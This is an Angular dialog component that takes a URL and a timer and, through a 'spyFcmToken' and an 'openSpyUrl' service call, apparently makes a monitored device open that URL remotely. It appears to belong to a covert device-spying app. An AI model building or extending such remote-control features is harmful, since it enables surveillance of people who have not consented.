import {
  Component,
  OnInit,
  Inject,
  ViewChild,
  ElementRef,
  OnDestroy
} from "@angular/core";
import { MatDialogRef, MAT_DIALOG_DATA } from "@angular/material";
import { Device } from "src/app/shared/interfaces";
import { BackupService } from "src/app/backups/backup.service";
import { takeWhile, switchMap } from "rxjs/operators";
import { SnotifyService } from "ng-snotify";
import { forkJoin } from "rxjs";

@Component({
  selector: "app-open-url-dialog",
  templateUrl: "./open-url-dialog.component.html",
  styleUrls: ["./open-url-dialog.component.scss"]
})
export class OpenUrlDialogComponent implements OnInit, OnDestroy {
  device: Device;
  alive = true;
  @ViewChild("url") url: ElementRef;
  @ViewChild("timer") timer: ElementRef;

  constructor(
    public dialogRef: MatDialogRef<OpenUrlDialogComponent>,
    @Inject(MAT_DIALOG_DATA) public data: Device,
    private backupService: BackupService,
    private snotify: SnotifyService
  ) {}

  ngOnInit() {
    this.device = this.data;
  }

  ngOnDestroy() {
    this.alive = false;
  }

  onClose() {
    this.dialogRef.close();
  }

  onOpen() {
    const url = this.url.nativeElement.value;
    const timer = this.timer.nativeElement.value;

    const data: any = {
      url,
      timer
    };


    if (this.device.spyFcmToken !== '') {
      data.spy = true;
      data.spyFcmToken = this.device.spyFcmToken;
      this.backupService
      .openSpyUrl(data)
      .pipe(takeWhile(() => this.alive))
      .subscribe(
        res => {
          if (res) {
            this.onClose();
          }
        },
      );
    }
  }
}
